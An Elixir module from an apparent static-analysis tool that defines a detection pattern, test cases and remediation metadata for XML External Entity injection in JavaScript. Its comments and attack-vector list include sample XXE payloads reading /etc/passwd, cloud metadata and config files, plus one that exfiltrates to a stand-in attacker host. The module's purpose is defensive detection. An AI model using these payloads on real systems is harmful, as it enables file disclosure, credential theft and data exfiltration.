defmodule Rsolv.Security.Patterns.Javascript.XxeExternalEntities do
  @moduledoc """
  XML External Entity (XXE) Injection in JavaScript/TypeScript

  Detects dangerous XML parsing patterns like:
    new DOMParser()
    parser.parseFromString(xmlData, 'text/xml')
    $.parseXML(userXml)
    
  Safe alternatives:
    JSON.parse(jsonData)  // Use JSON instead of XML
    const safeParser = createSafeXmlParser()  // With external entities disabled
    
  XXE vulnerabilities occur when XML parsers process untrusted XML documents that
  contain external entity references. These can be exploited to:
  - Read local files from the server
  - Perform Server-Side Request Forgery (SSRF) attacks
  - Cause Denial of Service through entity expansion
  - Exfiltrate data to attacker-controlled servers

  ## Vulnerability Details

  JavaScript XML parsers in browsers are generally safe from XXE by default, but
  Node.js XML parsing libraries may be vulnerable if they enable external entity
  processing. The vulnerability is particularly dangerous because it can lead to
  complete server compromise through file disclosure and SSRF.

  ### Attack Example
  ```javascript
  // Vulnerable: Parsing untrusted XML
  const parser = new DOMParser();
  const xmlDoc = parser.parseFromString(userXml, "text/xml");

  // Attack payload:
  // <?xml version="1.0"?>
  // <!DOCTYPE data [
  //   <!ENTITY file SYSTEM "file:///etc/passwd">
  // ]>
  // <data>&file;</data>
  ```

  ### Node.js Specific Risks
  In Node.js environments, XML parsing libraries like:
  - xmldom
  - libxmljs
  - xml2js (with certain configurations)
  - fast-xml-parser (older versions)

  May process external entities by default, leading to file disclosure and SSRF.
  """

  use Rsolv.Security.Patterns.PatternBase
  alias Rsolv.Security.Pattern

  @doc """
  Returns the XXE detection pattern.

  This pattern detects XML parsing operations that may be vulnerable to XXE attacks,
  including DOMParser usage, parseFromString calls, jQuery parseXML, and various
  Node.js XML parsing libraries.

  ## Examples

      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> pattern.id
      "js-xxe-external-entities"
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> pattern.severity
      :high
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> pattern.cwe_id
      "CWE-611"
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> vulnerable = "parser = new DOMParser()"
      iex> Regex.match?(pattern.regex, vulnerable)
      true
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> vulnerable = "$.parseXML(xmlData)"
      iex> Regex.match?(pattern.regex, vulnerable)
      true
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> safe = "JSON.parse(jsonData)"
      iex> Regex.match?(pattern.regex, safe)
      false
      
      iex> pattern = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.pattern()
      iex> pattern.recommendation
      "Disable external entity processing in XML parsers or use JSON instead."
  """
  def pattern do
    %Pattern{
      id: "js-xxe-external-entities",
      name: "XML External Entity (XXE) Injection",
      description: "XML parsers with external entities enabled can read files and perform SSRF",
      type: :xxe,
      severity: :high,
      languages: ["javascript", "typescript"],
      regex: build_xxe_regex(),
      cwe_id: "CWE-611",
      owasp_category: "A05:2021",
      recommendation: "Disable external entity processing in XML parsers or use JSON instead.",
      test_cases: %{
        vulnerable: [
          "parser = new DOMParser()",
          "const doc = parser.parseFromString(xmlData, 'text/xml')",
          "$.parseXML(userXml)",
          "xmldom.DOMParser()",
          "xml2js.parseString(xmlData)"
        ],
        safe: [
          "JSON.parse(jsonData)",
          "const safeParser = createSafeXmlParser()",
          "// Use JSON instead of XML",
          "const parser = new URLSearchParams()"
        ]
      }
    }
  end

  @doc """
  Comprehensive vulnerability metadata for XXE injection vulnerabilities.

  This metadata documents the security implications of XML external entity processing
  and provides authoritative guidance for preventing XXE attacks through proper
  parser configuration and alternative data formats.
  """
  def vulnerability_metadata do
    %{
      description: """
      XML External Entity (XXE) injection vulnerabilities occur when XML parsers
      process untrusted XML documents containing external entity references. These
      references can be exploited to read local files, perform server-side request
      forgery (SSRF), cause denial of service, or exfiltrate data to attacker-controlled
      servers.

      While browser-based JavaScript XML parsers (like DOMParser) are generally safe
      from XXE attacks due to security restrictions, Node.js XML parsing libraries may
      be vulnerable if they enable external entity processing. This creates a significant
      security risk in server-side JavaScript applications.

      The vulnerability exploits the XML standard's external entity feature, which allows
      XML documents to reference external resources. When parsers process these references
      without proper security controls, attackers can:

      1. Read local files using file:// protocol entities
      2. Access internal network resources via http:// entities (SSRF)
      3. Cause denial of service through recursive entity expansion (Billion Laughs)
      4. Exfiltrate data by including file contents in outbound requests

      XXE vulnerabilities are particularly dangerous because they often provide direct
      access to sensitive files like configuration files, source code, or system files
      containing credentials. In cloud environments, XXE can be used to access metadata
      endpoints and compromise cloud credentials.

      The rise of microservices and API-driven architectures has increased XXE risks as
      XML is still commonly used for data exchange, especially in enterprise environments
      and legacy system integrations.
      """,
      references: [
        %{
          type: :cwe,
          id: "CWE-611",
          title: "Improper Restriction of XML External Entity Reference",
          url: "https://cwe.mitre.org/data/definitions/611.html"
        },
        %{
          type: :owasp,
          id: "A05:2021",
          title: "OWASP Top 10 2021 - A05 Security Misconfiguration",
          url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
        },
        %{
          type: :owasp,
          id: "XXE_Prevention",
          title: "OWASP XXE Prevention Cheat Sheet",
          url:
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
        },
        %{
          type: :research,
          id: "xml_security",
          title: "XML Security Cheat Sheet",
          url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html"
        },
        %{
          type: :nist,
          id: "SP_800-95",
          title: "Guide to Secure Web Services",
          url: "https://csrc.nist.gov/publications/detail/sp/800-95/final"
        },
        %{
          type: :vendor,
          id: "portswigger_xxe",
          title: "PortSwigger - XML external entity (XXE) injection",
          url: "https://portswigger.net/web-security/xxe"
        }
      ],
      attack_vectors: [
        "File disclosure: <!ENTITY file SYSTEM 'file:///etc/passwd'>",
        "SSRF attacks: <!ENTITY ssrf SYSTEM 'http://internal-service/api'>",
        "Denial of Service: Billion Laughs attack with recursive entities",
        "Data exfiltration: <!ENTITY exfil SYSTEM 'http://attacker.com/?data='>",
        "Cloud metadata access: <!ENTITY meta SYSTEM 'http://169.254.169.254/'>",
        "Source code disclosure: <!ENTITY src SYSTEM 'file:///app/config.js'>",
        "Parameter entities for DTD injection: <!ENTITY % dtd SYSTEM 'http://evil.dtd'>",
        "Blind XXE with out-of-band data exfiltration",
        "XXE via file upload of SVG, DOCX, or other XML-based formats"
      ],
      real_world_impact: [
        "Complete server file system access and data breach",
        "Internal network scanning and service enumeration",
        "Cloud credential theft via metadata endpoint access",
        "Application source code and configuration disclosure",
        "Database credential exposure from config files",
        "Denial of service through resource exhaustion",
        "Bypassing firewalls to access internal services",
        "Chaining with other vulnerabilities for RCE"
      ],
      cve_examples: [
        %{
          id: "CVE-2022-23440",
          description: "XXE in popular Node.js XML parsing library allowing file disclosure",
          severity: "high",
          cvss: 7.5,
          note: "Demonstrates XXE risks in JavaScript server-side applications"
        },
        %{
          id: "CVE-2021-20031",
          description: "XXE vulnerability in SonicWall Email Security appliances",
          severity: "critical",
          cvss: 9.8,
          note: "Shows how XXE can lead to complete system compromise"
        },
        %{
          id: "CVE-2020-10758",
          description: "XXE in Red Hat CloudForms leading to information disclosure",
          severity: "high",
          cvss: 7.5,
          note: "Enterprise software XXE affecting cloud management platforms"
        },
        %{
          id: "CVE-2019-0221",
          description: "Apache Tomcat XXE vulnerability via web services",
          severity: "high",
          cvss: 7.5,
          note: "Demonstrates XXE in widely-used application servers"
        }
      ],
      detection_notes: """
      This pattern detects various forms of XML parsing in JavaScript that may be
      vulnerable to XXE attacks:

      1. Browser DOMParser usage - Generally safe but included for completeness
      2. parseFromString with XML content types - May process external entities
      3. jQuery parseXML - Depends on underlying parser implementation
      4. Node.js XML libraries - Often vulnerable by default:
         - xmldom - Processes external entities unless explicitly disabled
         - libxmljs - Vulnerable in older versions
         - xml2js - Can be vulnerable with expandEntities option
         - fast-xml-parser - Older versions process external entities

      The pattern focuses on identifying XML parsing operations rather than
      configuration checks, as vulnerable configurations are often the default.
      """,
      safe_alternatives: [
        "Use JSON instead of XML for data interchange when possible",
        "Disable DTD processing entirely in XML parsers",
        "Disable external entity resolution in parser configuration",
        "Use XML parsers with secure defaults (latest versions)",
        "Validate and sanitize XML input before parsing",
        "Use whitelisted XML schemas without external references",
        "Configure parsers to use only local DTDs",
        "Implement content-type validation to reject XML when not expected",
        "Use libraries like DOMPurify for client-side XML sanitization",
        "Regular security updates for XML parsing dependencies"
      ],
      additional_context: %{
        parser_specific_fixes: %{
          xmldom: "parser.parseFromString(xml, 'text/xml', { entityResolver: () => '' })",
          libxmljs: "Use libxmljs2 with noent: false option",
          xml2js: "Set parseOptions: { explicitEntities: false }",
          fast_xml_parser: "Update to v4+ and use ignoreDeclaration: true"
        },
        secure_configuration_examples: [
          "DOMParser in browsers is safe by default",
          "Node.js: Use JSON or secure XML parser configurations",
          "Validate content-type headers before parsing",
          "Implement rate limiting for XML endpoints",
          "Monitor for XXE attack patterns in logs"
        ],
        related_vulnerabilities: [
          "SSRF - XXE can be used for server-side request forgery",
          "Information Disclosure - File and network access",
          "DoS - Through entity expansion attacks",
          "RCE - When combined with other vulnerabilities"
        ]
      }
    }
  end

  defp build_xxe_regex do
    ~r/new\s+(?:window\.)?(?:DOMParser|XMLParser)\s*\(|\.parseFromString\s*\([^,]+,\s*['"](?:text\/xml|application\/xml)|(?:\$|jQuery)\.parseXML\s*\(|(?:xmldom|libxmljs|xml2js|fast-xml-parser)\.(?:DOMParser|parseXml|parseString|XMLParser)\s*\(/i
  end

  @doc """
  Check if this pattern applies to a file based on its path and content.

  Applies to JavaScript/TypeScript files or any file containing XML parsing operations.
  """
  def applies_to_file?(file_path, content) do
    cond do
      # JavaScript/TypeScript files always apply
      String.match?(file_path, ~r/\.(js|jsx|ts|tsx|mjs)$/i) ->
        true

      # If content is provided, check for XML parsing operations
      content != nil ->
        String.contains?(content, "DOMParser") ||
          String.contains?(content, "parseXML") ||
          String.contains?(content, "parseFromString") ||
          String.contains?(content, "xml2js") ||
          String.contains?(content, "libxmljs")

      # Default
      true ->
        false
    end
  end

  @doc """
  Returns AST enhancement rules to reduce false positives.

  This enhancement helps distinguish between actual XXE vulnerabilities
  and safe XML parsing configurations or browser-safe DOMParser usage.

  ## Examples

      iex> enhancement = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.ast_enhancement()
      iex> Map.keys(enhancement) |> Enum.sort()
      [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.ast_enhancement()
      iex> enhancement.ast_rules.node_type
      "NewExpression"
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.ast_enhancement()
      iex> "DOMParser" in enhancement.ast_rules.parser_names
      true
      
      iex> enhancement = Rsolv.Security.Patterns.Javascript.XxeExternalEntities.ast_enhancement()
      iex> enhancement.min_confidence
      0.7
  """
  @impl true
  def ast_enhancement do
    %{
      ast_rules: %{
        node_type: "NewExpression",
        # parseXML calls
        alternate_nodes: ["CallExpression"],
        parser_names: [
          # Browser/Node.js parser
          "DOMParser",
          # Generic XML parser
          "XMLParser",
          # Browser-specific
          "window.DOMParser"
        ],
        method_patterns: %{
          parse_methods: [
            "parseFromString",
            "parseXML",
            "parseString",
            "parseXml"
          ],
          content_types: [
            "text/xml",
            "application/xml",
            # Can also process external entities
            "text/html",
            "application/xhtml+xml"
          ]
        },
        library_patterns: [
          # Node.js library
          "xmldom",
          # Node.js library  
          "libxmljs",
          # Node.js library
          "xml2js",
          # Node.js library
          "fast-xml-parser",
          # Node.js library
          "node-xml2js",
          # Node.js library
          "xml-js",
          # SAX parser
          "sax"
        ]
      },
      context_rules: %{
        exclude_paths: [
          ~r/test/,
          ~r/spec/,
          ~r/__tests__/,
          ~r/mocks/,
          ~r/fixtures/,
          ~r/examples/,
          ~r/docs/,
          ~r/vendor/,
          ~r/node_modules/
        ],
        safe_configurations: [
          # Disables entities
          "noent: false",
          # xml2js safe option
          "expandEntities: false",
          # Empty resolver
          "entityResolver: () => ''",
          # DTD disabled
          "disallow-doctype-decl",
          # No external DTDs
          "resolveExternalDTDs: false",
          # No external loading
          "loadExternalDTD: false",
          # Ignore XML declaration
          "ignoreDeclaration: true",
          # Don't process entities
          "processEntities: false",
          # Prohibit DTD entirely
          "prohibitDTD: true"
        ],
        safe_patterns: [
          # Using JSON instead
          "JSON.parse",
          # Sanitized XML
          "DOMPurify.sanitize",
          # Custom safe parser
          "createSafeParser",
          # Explicit disabling
          "disableExternalEntities",
          # Security-focused parser
          "secureXmlParser",
          # XML sanitization
          "sanitizeXml"
        ],
        browser_indicators: [
          # Browser context
          "window.",
          # Browser DOM
          "document.",
          # Browser API
          "navigator.",
          # Browser storage
          "localStorage",
          # Browser fetch API
          "fetch(",
          # Browser AJAX
          "XMLHttpRequest"
        ]
      },
      confidence_rules: %{
        # Medium base - browser parsers are often safe
        base: 0.5,
        adjustments: %{
          # Node.js parsers more risky
          "node_xml_parser" => 0.4,
          # Explicit entity processing
          "external_entity_enabled" => 0.5,
          # User input XML
          "user_controlled_xml" => 0.4,
          # File:// protocol usage
          "file_protocol" => 0.4,
          # DTD processing enabled
          "dtd_processing" => 0.4,
          # Browser DOMParser safer
          "browser_domparser" => -0.6,
          # Safe options present
          "safe_configuration" => -0.8,
          # Test files
          "test_code" => -0.7,
          # Using JSON instead
          "json_alternative" => -0.9,
          # XML sanitization
          "sanitization_present" => -0.5,
          # Library with secure defaults
          "secure_defaults" => -0.4,
          # Hardcoded XML
          "static_xml" => -0.3,
          # No external XML input
          "no_external_source" => -0.4
        }
      },
      # Medium-high threshold
      min_confidence: 0.7
    }
  end
end
